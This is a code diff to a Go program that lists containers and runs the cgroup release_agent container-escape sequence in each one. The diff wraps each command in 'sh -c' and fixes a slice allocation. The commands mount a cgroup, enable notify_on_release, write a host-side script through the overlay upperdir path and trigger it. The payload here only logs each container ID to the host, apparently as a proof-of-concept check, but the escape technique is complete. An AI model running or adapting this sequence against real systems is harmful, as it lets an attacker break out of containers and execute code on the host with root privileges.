@@ -37,17 +37,17 @@ func main() {
 		panic(err)
 	}
 
-	containerIDs := make([]string, 0, len(containers))
+	containerIDs := make([]string, len(containers))
 
 	for i, container := range containers {
 		containerIDs[i] = container.ID
 		fmt.Printf("Container ID: %s\n", container.ID)
 		commands := [][]string{
-			{`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
-			{`echo 1 > /tmp/cgrp/x/notify_on_release`},
-			{`echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
-			{`echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
-			{`echo 0 > /tmp/cgrp/x/cgroup.procs`},
+			{"sh", "-c", `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
+			{"sh", "-c", `echo 1 > /tmp/cgrp/x/notify_on_release`},
+			{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
+			{"sh", "-c", `echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
+			{"sh", "-c", `echo 0 > /tmp/cgrp/x/cgroup.procs`},
 			{"sh", "-c", `echo \$\$ > /tmp/cgrp/x/cgroup.procs`},
 		}
 		for _, cmd := range commands {
